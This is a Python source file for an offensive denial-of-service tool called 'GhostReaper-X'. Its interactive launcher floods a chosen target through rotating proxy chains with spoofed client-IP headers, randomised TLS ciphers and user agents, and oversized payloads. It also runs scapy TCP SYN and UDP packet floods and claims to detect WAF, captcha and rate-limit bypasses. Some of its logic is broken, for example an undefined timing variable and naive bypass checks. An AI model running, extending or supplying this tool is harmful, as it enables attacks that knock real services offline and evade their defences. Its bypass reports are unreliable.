import http.client
import ssl
import json
import random
import threading
import time
from urllib.parse import urlparse
import socket
import sys
import traceback
import asyncio
from scapy.all import *

# ANSI color codes for output
ANSI_RED = "\033[91m"
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_CYAN = "\033[96m"
ANSI_RESET = "\033[0m"

# Global variables
target = ""
threads = 0
proxy_file = ""
hop_count = 0
payload_type = ""
ua_file = ""
bypass_header = False
tls_spoofing = False
session_cycle = False
exploit_chain = False
delay = 0
flood_method = ""
failover_monitoring = False
proxies = []
user_agents = []
headers = {}
tls_context = ssl.create_default_context()
status_counter = {"200": 0, "403": 0, "503": 0, "other": 0}
parsed_url = urlparse(target)
semaphore = threading.Semaphore(100)  # Limit the number of concurrent threads

# Load proxies and user agents
def load_proxies(file):
    global proxies
    with open(file, 'r') as f:
        proxies = [line.strip() for line in f]
    validate_proxies()

def validate_proxies():
    valid_proxies = []
    for proxy in proxies:
        try:
            conn = http.client.HTTPSConnection(proxy, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            if resp.status == 200:
                valid_proxies.append(proxy)
        except:
            pass
    proxies[:] = valid_proxies  # Update the global proxies list

def load_user_agents(file):
    global user_agents
    with open(file, 'r') as f:
        user_agents = [line.strip() for line in f]

# Inject headers with random chaining
def inject_headers():
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
    }
    if bypass_header:
        headers["X-Originating-IP"] = random.choice(proxies)
        headers["X-Forwarded-Host"] = target
        headers["X-Request-ID"] = str(random.randint(100000, 999999))
        headers["X-Amzn-Trace-Id"] = f"Root=1-{random.randint(10000000,99999999)}"
        headers["User-Agent"] = random.choice(user_agents)
        headers["X-Forwarded-For"] = random.choice(proxies)
        headers["X-Real-IP"] = random.choice(proxies)
        headers["Via"] = random.choice(proxies)
        headers["Forwarded"] = f"for={random.choice(proxies)};host={target}"
        headers["True-Client-IP"] = random.choice(proxies)
        headers = {k: v.upper() if random.choice([True, False]) else v for k, v in headers.items()}
        headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})
    return headers

# Mutate payload for various types
def mutate_payload(payload_type):
    if payload_type == "ghost-mutation":
        # Payload chaining and size amplification
        return json.dumps({
            "action": "ghost",
            "random": random.randint(1, 9999),
            "chain": ["A"*random.randint(100, 500) for _ in range(10)],
            "overflow": "X" * random.randint(10000, 30000)
        })
    elif payload_type == "form":
        return "key=value&random=" + str(random.randint(1, 9999))
    elif payload_type == "multipart":
        boundary = "----WebKitFormBoundary" + str(random.randint(1000, 9999))
        data = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="key"\r\n\r\n'
            f"value\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="random"\r\n\r\n'
            f"{random.randint(1, 9999)}\r\n"
            f"--{boundary}--\r\n"
        )
        return data
    else:
        return json.dumps({"error": "unknown payload type"})

# Rotate proxy chain
def rotate_proxy_chain():
    if proxies:
        return random.sample(proxies, k=random.randint(1, hop_count))
    return []

# Cycle session (simulate login, action, logout)
def cycle_session():
    try:
        # Simulate login
        login_payload = {"username": "user", "password": "pass"}
        login_headers = inject_headers()
        login_headers['User-Agent'] = random.choice(user_agents)
        conn = http.client.HTTPSConnection(random.choice(proxies), context=tls_context)
        conn.request("POST", "/login", json.dumps(login_payload), login_headers)
        response = conn.getresponse()
        if response.status != 200:
            print(f"Login failed with status code {response.status}")
            return

        # Perform action
        action_payload = mutate_payload(payload_type)
        action_headers = inject_headers()
        action_headers['User-Agent'] = random.choice(user_agents)
        conn.request(flood_method.upper(), target, action_payload, action_headers)
        response = conn.getresponse()
        handle_response(response, target, 1, time.time() - start_time)

        # Simulate logout
        logout_headers = inject_headers()
        logout_headers['User-Agent'] = random.choice(user_agents)
        conn.request("POST", "/logout", "", logout_headers)
        response = conn.getresponse()
        if response.status != 200:
            print(f"Logout failed with status code {response.status}")
    except Exception as e:
        print(f"{ANSI_RED}[ERROR] cycle_session: {traceback.format_exc()}{ANSI_RESET}")

# Handle response and update status counter
def handle_response(response, target, proxy_hop, rtt):
    status_code = response.status
    response_body = response.read().decode('utf-8', errors='ignore')
    if 200 <= status_code < 300:
        print(f"{ANSI_GREEN}[200] OK - RTT: {rtt * 1000:.2f}ms - UA: {headers['User-Agent']} - Payload: {payload_type}{ANSI_RESET}")
        status_counter["200"] += 1
    elif status_code == 403:
        print(f"{ANSI_RED}[403] Blocked - Rotating Header/TLS{ANSI_RESET}")
        status_counter["403"] += 1
        rotate_headers_and_tls()
    elif status_code == 429:
        print(f"{ANSI_YELLOW}[429] Rate Limit - Throttle Mode{ANSI_RESET}")
        status_counter["other"] += 1
        time.sleep(delay + random.uniform(0.2, 1.0))
    elif status_code == 503:
        print(f"{ANSI_YELLOW}[503] Overload - Increasing Pressure{ANSI_RESET}")
        status_counter["503"] += 1
        time.sleep(delay + random.uniform(0.2, 1.0))
    else:
        print(f"{ANSI_RED}[ERROR] Unknown response code {status_code}{ANSI_RESET}")
        status_counter["other"] += 1

    analyze_bypass(status_code, response_body)

# Rotate headers and TLS
def rotate_headers_and_tls():
    global headers, tls_context
    headers = inject_headers()
    tls_context = rotate_tls_context()

# Rotate TLS context
def rotate_tls_context():
    ctx = ssl.create_default_context()
    ctx.set_ciphers(random.choice([
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "TLS_AES_256_GCM_SHA384"
    ]))
    return ctx

# Analyze security bypass
def analyze_bypass(status_code, response_text):
    try:
        if "cpatha" in response_text.lower():
            print(f"{ANSI_RED}[!] CPATHA Detected{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] CPATHA Bypass{ANSI_RESET}")

        if "captcha" in response_text.lower():
            print(f"{ANSI_RED}[!] Captcha Firewall Triggered{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] Captcha Bypass{ANSI_RESET}")

        if "cf-ray" in response_text.lower() or "cloudflare" in response_text.lower():
            print(f"{ANSI_GREEN}[✓] WAF Bypass (Cloudflare){ANSI_RESET}")
        elif "x-waf" in response_text.lower():
            print(f"{ANSI_GREEN}[✓] WAF Bypass (Generic){ANSI_RESET}")
        elif status_code == 403:
            print(f"{ANSI_RED}[!] WAF Blocked{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] WAF Passed{ANSI_RESET}")

        if status_code == 429:
            print(f"{ANSI_RED}[!] Rate-Limit Triggered{ANSI_RESET}")
        else:
            print(f"{ANSI_GREEN}[✓] Rate-Limit Bypass{ANSI_RESET}")

        if "akamai" in response_text.lower() or "fastly" in response_text.lower():
            print(f"{ANSI_CYAN}[✓] CDN Identified & Routed{ANSI_RESET}")
    except Exception as e:
        print(f"{ANSI_RED}[ERROR] analyze_bypass: {traceback.format_exc()}{ANSI_RESET}")

# Monitor target status
def monitor_target():
    while True:
        try:
            conn = http.client.HTTPSConnection(parsed_url.netloc, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            print(f"[MONITOR] {resp.status}")
        except:
            print("[MONITOR] Target not responding.")
        time.sleep(5)

# Clone target headers
def clone_target_headers():
    conn = http.client.HTTPSConnection(parsed_url.netloc)
    conn.request("GET", "/")
    res = conn.getresponse()
    return dict(res.getheaders())

# Raw socket blast
def raw_socket_blast(ip, port=443):
    context = rotate_tls_context()
    with socket.create_connection((ip, port)) as sock:
        with context.wrap_socket(sock, server_hostname=ip) as ssock:
            for _ in range(3):
                payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nContent-Length: 10000\r\n\r\n{'A'*10000}"
                ssock.send(payload.encode())

# TCP SYN flood using scapy
def tcp_syn_flood(target_ip, target_port, duration):
    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(dport=target_port, flags="S")
    raw_layer = Raw(load="X"*1024)
    packet = ip_layer / tcp_layer / raw_layer
    send(packet, loop=1, count=duration, inter=0.001)

# UDP flood using scapy
def udp_flood(target_ip, target_port, duration):
    ip_layer = IP(dst=target_ip)
    udp_layer = UDP(dport=target_port)
    raw_layer = Raw(load="X"*1024)
    packet = ip_layer / udp_layer / raw_layer
    send(packet, loop=1, count=duration, inter=0.001)

# Launch GhostReaper-X sequence
def launch_ghost_sequence():
    global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring

    print("""
   [1] Launch GhostReaper-X Sequence
   [2] Exit
   Select >
   """)
    choice = input("> ").strip()

    if choice == '1':
        target = input("[Target]        ")
        threads = int(input("[Threads]       "))
        proxy_file = input("[Proxy-List]    ")
        hop_count = int(input("[Proxy-Hop]     "))
        payload_type = input("[Payload-Type]   ")
        ua_file = input("[User-Agent-List] ")
        bypass_header = input("[Bypass-Header] ").lower() == 'yes'
        tls_spoofing = input("[TLS-Spoofing]  ").lower() == 'yes'
        session_cycle = input("[Session-Cycle] ").lower() == 'yes'
        exploit_chain = input("[Exploit-Chain] ").lower() == 'yes'
        delay = float(input("[Delay]         "))
        flood_method = input("[Flood-Method]  ")
        failover_monitoring = input("[Failover-Monitoring] ").lower() == 'yes'

        print("\nReady to launch GhostReaper-X Sequence")
        print(f"Target     : {target}")
        print(f"Threads    : {threads}")
        print(f"Proxies    : {proxy_file} ({hop_count} hop)")
        print(f"Payload    : {payload_type}")
        print(f"TLS Finger : { 'Enabled' if tls_spoofing else 'Disabled' }")
        print(f"Header Bypass : { 'Enabled' if bypass_header else 'Disabled' }")
        print(f"Session Cycle : { 'Enabled' if session_cycle else 'Disabled' }")
        print(f"Exploit Chain : { 'Enabled' if exploit_chain else 'Disabled' }")
        print(f"Delay      : {delay}s")
        print(f"Flood Method: {flood_method}")
        print(f"Failover Monitoring : { 'Enabled' if failover_monitoring else 'Disabled' }")
        input("[Enter] to begin sequence...\n")

        load_proxies(proxy_file)
        load_user_agents(ua_file)

        def worker():
            global headers, tls_context
            tls_context = rotate_tls_context()
            while True:
                try:
                    semaphore.acquire()
                    proxy_chain = rotate_proxy_chain()
                    for proxy in proxy_chain:
                        parsed_url = urlparse(target)
                        conn = http.client.HTTPSConnection(proxy, context=tls_context)
                        headers = inject_headers()
                        headers['User-Agent'] = random.choice(user_agents)
                        target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
                        headers[f"X-Chain-{random.randint(1, 5)}"] = "Exploit" + str(random.randint(1000, 9999))
                        payload_data = mutate_payload(payload_type)
                        conn.request(flood_method.upper(), target_path, payload_data, headers)
                        start_time = time.time()
                        response = conn.getresponse()
                        rtt = time.time() - start_time
                        handle_response(response, target, proxy_chain.index(proxy) + 1, rtt)
                        if session_cycle:
                            cycle_session()
                        if failover_monitoring and response.status in [403, 429, 503]:
                            time.sleep(delay + random.uniform(0.2, 1.0))
                except Exception as e:
                    print(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}")
                finally:
                    semaphore.release()

        thread_pool = []
        for _ in range(threads):
            thread = threading.Thread(target=worker)
            thread.start()
            thread_pool.append(thread)

        if failover_monitoring:
            threading.Thread(target=monitor_target).start()

        for thread in thread_pool:
            thread.join()

        print("GhostReaper-X sequence terminated.")

    elif choice == '2':
        print("Exiting...")
    else:
        print("Invalid choice. Please select [1] or [2].")

def print_status():
    while True:
        print(f"✅ 200: {status_counter['200']} | 🔒 403: {status_counter['403']} | ⚠️ 503: {status_counter['503']}")
        sys.stdout.flush()
        time.sleep(5)

# Main function to start the attack
if __name__ == "__main__":
    threading.Thread(target=print_status).start()
    launch_ghost_sequence()